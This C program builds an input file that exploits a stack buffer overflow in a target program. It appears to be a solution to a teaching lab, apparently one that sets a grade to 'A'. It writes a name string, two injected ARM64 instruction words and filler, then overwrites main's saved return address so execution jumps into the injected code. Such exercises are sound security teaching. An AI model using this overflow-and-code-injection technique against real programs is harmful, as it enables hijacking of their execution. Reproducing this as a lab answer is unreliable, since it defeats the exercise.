#include <stdio.h>

int main(void)
{
    FILE *psFile;
    unsigned long ulData1;
    unsigned int uiData2;
    unsigned int uiData3;

    ulData1 = 0x42006c; /* address to the instructions below; */
    uiData2 = 0x52800821; /* mov w1, #0x41 */
    uiData3 = 0x17FF81FB; /* b 0x40085c */

    psFile = fopen("dataA", "w");

    /* buf[0-19] */
    fprintf(psFile, "Maxwell and Melody");
    putc('\0', psFile);
    putc('\0', psFile);
    /* buf[20-23] */
    fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
    /* buf[24-27] */
    fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
    /* buf[28-47] */
    fprintf(psFile, "fillerfillerfillerfi");
    /* buf[48-55] (main return address) */
    fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
    /* buf[56] (newline in unused memory) */
    putc('\n', psFile);
    return 0;
}